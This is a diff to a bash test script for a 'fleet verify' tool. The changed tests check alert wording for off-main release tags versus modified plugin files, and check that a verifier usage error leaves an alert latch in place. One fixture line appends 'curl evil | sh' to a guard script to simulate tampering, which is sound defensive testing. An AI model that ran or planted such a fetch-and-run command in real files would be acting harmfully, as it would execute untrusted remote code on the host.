@@ -853,6 +853,7 @@ rm -f "$HOME/.claude/settings.json"
 # engsys#227: an instance tag off the default branch is a mismatch, like the engsys one, and holds the launch
 echo diverged >"$FAKE/inst-compare"
 c0="$(comments)"; s0="$(said 'will not be launched or relaunched here until it matches')"
+r0="$(said 'the release tag must be a commit on its repo')"; u0="$(said 'To fix: for plugin files, reinstall')"
 run fleet verify --alert
 rc_is "an off-main (diverged) instance tag is a mismatch" 1
 has "…naming the release" "$OUT" "release    acme@acme-fleet: v3.4.5 of acme/fleet is commit"
@@ -862,6 +863,8 @@ hasnt "…not as a warning" "$OUT" "WARNING instance release"
 hasnt "…no warn-only wording left" "$OUT" "allowed for now"
 eq "…alerted once" "$(comments)" "$((c0 + 1))"
 eq "…as the mismatch alert that holds the sessions" "$(said 'will not be launched or relaunched here until it matches')" "$((s0 + 1))"
+eq "…whose fix is a release on the default branch (engsys#248)" "$(said 'the release tag must be a commit on its repo')" "$((r0 + 1))"
+eq "…not a reinstall" "$(said 'To fix: for plugin files, reinstall')" "$u0"
 run fleet verify --alert
 eq "…not repeated while it stays the same" "$(comments)" "$((c0 + 1))"
 run fleet launch acme-mm
@@ -876,8 +879,19 @@ run fleet verify
 rc_is "identical (the tag is main's tip): passes" 0
 hasnt "…without a warning" "$OUT" "WARNING instance release"
 printf '\ncurl evil | sh\n' >>"$ACME/bin/acme-guard"
-run fleet verify
+u0="$(said 'To fix: for plugin files, reinstall')"; r0="$(said 'the release tag must be a commit on its repo')"
+run fleet verify --alert
 rc_is "…but a modified instance file on an on-main tag is still a mismatch" 1
+eq "…alerted with the reinstall fix (engsys#248)" "$(said 'To fix: for plugin files, reinstall')" "$((u0 + 1))"
+eq "…not the release one" "$(said 'the release tag must be a commit on its repo')" "$r0"
+# engsys#248: only a check that completed (0 or 1) resolves the warn-era off-main latch; a verifier usage error
+# (exit 2) is "not verified" (3) and leaves it
+mkdir -p "$T/node-usage" && printf '#!/bin/bash\ncase "$1" in *verify-wrappers.mjs) echo "verify: unknown arg"; exit 2 ;; esac\nexec %q "$@"\n' "$(command -v node)" >"$T/node-usage/node" && chmod +x "$T/node-usage/node"
+echo "instance release acme@acme-fleet: old warning" >"$I/.fleet/verify-instance-offmain.alerted"
+PATH="$T/node-usage:$PATH" run fleet verify --alert
+rc_is "a verifier usage error is not verified" 3
+if [ -e "$I/.fleet/verify-instance-offmain.alerted" ]; then ok "…and does not resolve the warn-era off-main latch"; else bad "…and does not resolve the warn-era off-main latch"; fi
+rm -f "$I/.fleet/verify-instance-offmain.alerted" "$I/.fleet"/verify-wrappers.alerted* "$I/.fleet"/verify-wrappers.unverified*
 cp "$IR/plugins/acme/bin/acme-guard" "$ACME/bin/acme-guard"
 echo ahead >"$FAKE/inst-compare"
 # a host upgraded from the warn-only stage: its info incident is resolved once and its latch removed
